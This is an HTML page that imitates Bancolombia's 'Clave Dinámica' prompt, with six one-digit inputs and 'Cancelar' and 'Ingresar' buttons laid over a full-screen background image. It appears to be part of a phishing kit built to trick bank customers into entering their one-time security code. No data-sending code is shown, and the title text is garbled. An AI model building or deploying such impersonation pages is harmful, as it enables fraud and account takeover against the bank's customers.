<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clave Din치mica - Bancolombia</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            width: 100%;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        .image-container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        .image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        /* Texto "Ingrese Clave Din치mica" */
        .title-text {
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
            width: 100%;
        }
        
        /* Contenedor de las 6 rayitas */
        .center-box {
            position: absolute;
            top: 55%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgb(255, 255, 255);
            width: 290px;
            height: 66px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 8px;
        }
        
        .digits-container {
            display: flex;
            gap: 8px;
            width: 80%;
            justify-content: center;
        }
        
        .digit-input {
            width: 35px;
            height: 45px;
            border: none;
            border-bottom: 2px solid #ffe100;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            outline: none;
            background: transparent;
        }
        
        .digit-input:focus {
            border-bottom: 2px solid #210049;
        }
        
        .button-container {
            position: absolute;
            top: 70.4%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 10px;
        }
        
        .button-container button {
            padding: 13px 35px;
            font-size: 13px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .button-container button:first-child {
            background-color: #ffffff;
            border: 1px solid black;
        }
        
        .button-container button:last-child {
            background-color: #ffda37;
            color: black;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="img/cel11.jpg" alt="Background Image">
        
        <!-- Texto "Ingrese Clave Din치mica" -->
        <div class="title-text">Ingrese Clave Din치mica</div>
        
        <!-- Contenedor de las 6 rayitas -->
        <div class="center-box">
            <div class="digits-container">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
            </div>
        </div>
        
        <div class="button-container">
            <button>Cancelar</button>
            <button>Ingresar</button>
        </div>
    </div>
</body>
</html>
